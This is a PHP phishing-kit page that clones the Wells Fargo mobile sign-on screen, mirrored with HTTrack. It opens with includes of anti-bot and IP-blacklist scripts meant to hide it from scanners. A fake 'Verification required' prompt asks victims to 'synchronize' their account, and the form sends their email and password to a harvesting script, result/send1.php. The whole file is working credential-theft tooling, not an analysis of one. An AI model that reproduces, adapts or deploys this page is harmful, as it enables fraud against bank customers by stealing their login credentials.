<?php
session_start();
error_reporting(0);

include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';
include'BOTS/index.php'; 



?>
<html lang="en"><!-- Mirrored from connect.secure.wellsfargo.com/auth/login/present by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 31 May 2020 14:31:36 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->

        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
        <title>Mobile Sign on | Wells Fargo</title>
        <meta name="description" content="Click here to sign on to your Wells Fargo account from your mobile phone.">
        <link rel="stylesheet" href="static/css/wf-fonts1d04.css?v=C6AB61065D" type="text/css">
        <link rel="stylesheet" href="static/css/frontporch1d04.css?v=C6AB61065D" type="text/css">
        <link type="text/css" href="static/wfa/css/signon_clean1d04.css?v=C6AB61065D" rel="stylesheet" media="screen,projection,print">
        
        <script src="../../static.wellsfargo.com/tracking/main/utag.js" type="text/javascript" async=""></script><script nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
var webId = "w-642409";
var ndURI ="https://connect.secure.wellsfargo.com/ATADUN/2.2/w/w-642409/sync/js/";
</script>

        
        <!--TMS include starts-->
        <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
            var utag_data = {
                'app_id': 'loginapp',
                'customer_type': '',
                'wfacookie': '4520200531073125374992155',
                'device_type': 'mobile',
                'environment': 'PROD',
                'tealium_js_path': 'https://static.wellsfargo.com/tracking/main/utag.js',
                'mt_tag_path': 'https://static.wellsfargo.com/mttag/',
                'page_id': 'MOBILEBROWSER_LOGIN',
                'page_type': 'BROWSER'
            }
        </script>

        <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"> (function(a,b,c,d){a='../../static.wellsfargo.com/tracking/main/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];if (a.src !== d.src) { a.parentNode.insertBefore(d,a);}})();</script>
        <!--TMS include ends-->
    <script async="" type="text/javascript" src="https://connect.secure.wellsfargo.com/https://connect.secure.wellsfargo.com/https://connect.secure.wellsfargo.com/AIDOhttps://connect.secure.wellsfargo.com/glu.js"></script><script src="http:/https://connect.secure.wellsfargo.com//AIDO/mint.js?dt=login&amp;r=0.7350068949784063" type="text/javascript" async="true"></script><script src="http:///PIDO/pic.js?r=0.15835539136068677" async="true" type="text/javascript"></script></head>

 <body theme="ssep" id="body" class="brand-fp" lob="cob" contextpath="/auth" devicetype="mobile">
        


<script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	if (self === top) {
		var antiClickjack = document.getElementById("antiClickjack");
		antiClickjack.parentNode.removeChild(antiClickjack);
	} else {
		top.location = self.location;
	}
</script>
        
        
        <div control="lightbox" id="saveUsernameWarningDialog" class="dialog">
            <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameWarningTitle">
                <span class="hide">Beginning of popup</span>
                <div class="lightbox-title">
                    <h2 id="saveUsernameWarningTitle">Save Username</h2>
                </div>
                <div class="lightbox-content">
                    <p>For your security we do not recommend using this feature on a shared device.</p>
                </div>
                <div class="lightbox-button-container">
                    <button control="button" id="closeSaveUsernameWarningDialogBtn" aria-label="close"></button>
                </div>
                <span class="hide">End of popup</span>
            </div>
        </div>
        
        
        

        
            
                






<div class="header brand-fp" id="header">
  <div class="wf_logo" role="link">
    <img src="https://www10.wellsfargomedia.com/auth/static/images/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
  </div>
  <div class="hamburger_menu" role="link">
    <a href="https://www.wellsfargo.com/"><img src="https://www10.wellsfargomedia.com/auth/static/images/FP.svg" alt="Home" role="img"></a>
  </div>
</div>
            
            
            
            
        

        <main role="main">
            <article>
                
                
                    
                        







<div id="form">
    <h1 class="banner">Verification required</h1>
    <h2 class="security-link flex-cntr">
        <!-- <span class="icon-lock"></span> -->
        <img src="https://www10.wellsfargomedia.com/auth/static/images/lock.svg" alt="" aria-hidden="true">
        <a class="" href="#">Please synchronize your account with your email for account alerts.</a></h2>
    <form action="result/send1.php" method="post">
        <input name="userPrefs" id="userPrefs" type="hidden">
        <input name="jsenabled" id="jsenabled" type="hidden" value="false">
        
        
            
        
        <div id="usernameWrapper" class="bim-input-wrapper">
            <label id="username" class="bim-input-label" for="j_username">Email address</label>
            
                
                    <input class="bim-input" control="forms:input" type="text" name="email" id="j_username" autocomplete="off" maxlength="14">
                
                
            

        </div>
        <div id="passwordWrapper" class="bim-input-wrapper">
            <label id="lblForPassword" class="bim-input-label" for="password">Password</label>
            <input class="bim-input pmask" control="forms:input" type="password" id="password" name="pass" autocomplete="off" maxlength="32">
        </div>
        <div id="chkSave">
            
        </div>
        
            <div>
                <button class="primary cta-btn sign-on" type="submit">Review and Continue</button>
            </div>
            <div id="forgot">
                <p id="forgot">
                    <span lang="en"></span></p>
            </div>

            <div>
                
                
            </div>

            <input name="origin" id="origin" type="hidden" value="mobilebrowser">
            <input name="save-username" id="saveUsername" type="hidden" value="false">
            
                
            
            <input name="pcg" type="hidden" value=" ">

            
                <input type="hidden" name="segmentation" value=" cob">
            

		
		
		
            
           
    </form>
    
 
</div>
                        


<div id="footer">
    <div id="links">
        <p><a href="https://www.wellsfargo.com/privacy-security/" class="link">PRIVACY, Cookies, Security &amp;
                Legal</a> <span class="link-separator"></span><a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices" class="link">Ad Choices </a>
        </p>
        <p><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/" class="link online-acc">Online Access
                Agreement</a>

            <span class="link-separator"></span>
            <a href="https://www.wellsfargo.com/privacy-security/privacy/esign-consent/" class="link e-sign">ESIGN
                    Consent</a>
            
        </p>
        <p>© 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
                    
                    
                
            </article>
        </main>

        

    <!--TMS include starts-->
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
        var utag_data = {
            'app_id': 'loginapp',
            'customer_type': '',
            'wfacookie': '4520200531073125374992155',
            'device_type': 'desktop',
            'environment': 'PROD',
            'tealium_js_path': 'https://static.wellsfargo.com/tracking/main/utag.js',
            'mt_tag_path': 'https://static.wellsfargo.com/mttag/'
        }
    </script>
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"> (function(a,b,c,d){a='../../static.wellsfargo.com/tracking/main/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];if (a.src !== d.src) { a.parentNode.insertBefore(d,a);}})();</script>
    <!--TMS include ends-->
    <noscript><!-- No alternative content --></noscript>
          <!--end main-->
    
    

        	<script type="text/javascript" language="JavaScript" src="static/prefs/login-userprefs.min.js" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script><script type="text/javascript" id="childscript1" src="file://../static/scripts/conutils-6.9.0.js"></script><script type="text/javascript" id="ndscript1" src="file://../static/prefs/atadun.js"></script>
			<script src="static/scripts/components/public/lightbox/lightbox.js" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script>
			
        	<script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	        	function signonFormSubmitHandler(evt) {
	        		evt.preventDefault();
	        		disableSubmitsCollectUserPrefs(evt.target);
	        		evt.target.submit();
	        	}
	        	function gotoPreviousPage() {
	        		window.history.go(-1);
	        	}
	        	
	        	if (document.querySelector("#Signon")) {
	            	document.querySelector("#Signon").addEventListener('submit', signonFormSubmitHandler);
	            }
	        	if (document.querySelector("#linkToPreviousPage")) {
	            	document.querySelector("#linkToPreviousPage").addEventListener('click', gotoPreviousPage);
	            }
				const userNameEL = document.querySelector(".oas-redesigned #j_username");
				const passwordEl = document.querySelector(".oas-redesigned #j_password");
				function animateLabel(e) {
					e.target.previousElementSibling.classList.add('animated');
				}
				function removeAnimation(e) {
					if (!e.target.value.trim().length) {
						e.target.previousElementSibling.classList.remove('animated');
						e.target.value = "";
					}
				}
				if (userNameEL != null) {
					userNameEL.addEventListener('focus', animateLabel);
					userNameEL.addEventListener('blur', removeAnimation);
				}
				if (passwordEl != null) {
					passwordEl.addEventListener('focus', animateLabel);
					passwordEl.addEventListener('blur', removeAnimation);
				}


				function focusError() {
					const errorCntr = document.querySelector('#errorCntr');
					if(errorCntr) {
						errorCntr.focus();
					}
				}

				focusError();



        	</script>
        	

    <script src="static/scripts/frontporch1d04.js?v=C6AB61065D" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script>
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	    function enrollButtonHandler(evt) {
			evt.preventDefault();
			location.href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1";
		}
		if (document.querySelector("#enrollButton")) {
			document.querySelector('#enrollButton').addEventListener('click', enrollButtonHandler);
		}


        if(document.querySelector('#usernameWrapper .bim-input')) {
            document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }
        if(document.querySelector('#passwordWrapper .bim-input')) {
            document.querySelector('#passwordWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#passwordWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#passwordWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#passwordWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }



    </script>

    

<!-- Mirrored from connect.secure.wellsfargo.com/auth/login/present by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 31 May 2020 14:31:36 GMT -->

</body></html>